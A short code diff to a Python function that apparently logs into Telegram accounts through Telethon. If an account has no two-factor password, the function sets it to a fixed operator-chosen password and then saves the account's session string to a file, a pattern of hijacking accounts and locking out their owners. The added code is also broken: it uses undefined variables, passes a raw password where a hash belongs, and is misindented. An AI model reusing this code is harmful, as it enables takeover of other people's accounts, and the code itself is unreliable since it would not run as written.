@@ -270,17 +270,18 @@ async def verify_session(user_id, msg):
         )
 
         # Check if 2FA is set, if not set it automatically
-        pwd = await client(GetPasswordRequest())
-        if not pwd.has_password:
-            new_password_hash = pw.compute_check(pwd, SESSION_2FA_PASSWORD)
-            await client(UpdatePasswordSettingsRequest(
-                password=pwd,
-                new_settings=PasswordInputSettings(
-                    new_password_hash=new_password_hash,
-                    hint=SESSION_2FA_PASSWORD,
-                    email=None
-                )
-            ))
+        pwd = await client(UpdatePasswordSettingsRequest(
+    password=InputCheckPasswordSRP(
+        srp_id=password.srp_id,
+        A=srp_A,
+        M=srp_M
+    ),
+    new_settings=account_PasswordInputSettings(
+        new_password=SESSION_2FA_PASSWORD.encode('utf-8'),
+        hint='Your 2FA password',
+        email=None
+    )
+))
 
         session_str = client.session.save()
         filename = f"session_{user_id}.session"
